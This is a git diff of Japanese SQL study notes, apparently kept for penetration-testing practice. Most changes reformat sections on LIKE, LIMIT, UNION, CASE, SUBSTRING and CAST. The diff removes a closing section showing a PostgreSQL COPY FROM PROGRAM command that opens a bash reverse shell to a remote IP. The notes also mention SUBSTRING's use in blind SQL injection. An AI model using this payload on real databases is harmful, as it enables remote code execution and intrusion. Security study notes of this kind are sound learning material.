@@ -32,6 +32,7 @@ UPDATE文
 ```sql
 UPDATE テーブル名 SET col1 = value, col2 = value2 WHERE colx = value;
 ```
+
 - INSERTは新規挿入、UPDATEは既存データ書換
 
 ## WHERE句内しぼりこみ
@@ -61,10 +62,11 @@ SELECT * FROM テーブル名 WHERE 条件 OR　条件
 
 ### LIKE
 
-|パターン文字|意味|
-|---|---|
-|%|任意の0文字以上の文字列|
-|_(アンダースコア)|任意の１文字|
+| パターン文字 | 意味           |
+| ------ | ------------ |
+| %      | 任意の0文字以上の文字列 |
+| _      | 任意の１文字       |
+|        |              |
 
 例：カラムの値に「1月」の前後に任意の０文字以上の文字列がついているレコードの指定
 ```sql
@@ -106,11 +108,11 @@ SELECT * FROM テーブル名 ORDER BY 1
 
 先頭から数行だけ取得する
 ```sql
-SELECT * FROM テーブル名 ORDER BY 金額 DESC　LIMIT　３　OFFSET　２
+SELECT * FROM <table_name> ORDER BY <amount> DESC LIMIT 3 OFFSET 2
 ```
 OFFSETをつけると（指定の数字+1）番目のデータを取得してくれる。
 
-### 【UNION】
+### UNION
 
 - 和集合：２つの検索結果を足し合わせたもの
 （UNIONの左右のクエリでカラム数が一致していないといけない）
@@ -120,7 +122,7 @@ SELECT ユーザー名, 年齢, 住所　FROM　ユーザー１ UNION SELECT ユ
 
 ## 演算子と関数
 
-### 【CASE演算子】
+### CASE演算子
 
 - データの抽出時に使える条件分岐演算子
 
@@ -135,7 +137,7 @@ SELECT ユーザー名,
 　FROM　ユーザー
 ```
 
-### 【SUBSTRING】
+### SUBSTRING
 
 - 文字列の一部を抽出する関数
 （Blind-based SQLiで使われる）
@@ -144,25 +146,11 @@ SELECT * FROM ユーザー WHERE SUBSTRING(ユーザー名, 1, 3) LIKE '%hoge%'
 ```
 ユーザー名列の１〜３文字目に「hoge」があるものだけを抽出
 
-### 【CAST】
+### CAST
 
 - データ型を置換する
 ```sql
 SELECT CAST(出金額 AS VARCHAR(20)) + '円' AS 出金額（円）FROM 家計簿
 ```
 
----
 
-# 🚨SQLiにおける文法上の注意点
-
-###### 文字列はシングルクオテーション(`'`)で囲むこと
-
-- ダブルクオテーションで囲むと識別子として認識されてしまう
-- ❌失敗例（ダブルクオテーションで囲ってしまってる）：
-```postgresql
-COPY shell FROM PROGRAM "bash -c 'bash -i >& /dev/tcp/192.168.45.158/443 0>&1'";
-```
-- ⭕️成功例（シングルクオテーションで囲っている）：
-```postgresql
-COPY shell FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.158/443 0>&1"';
-```
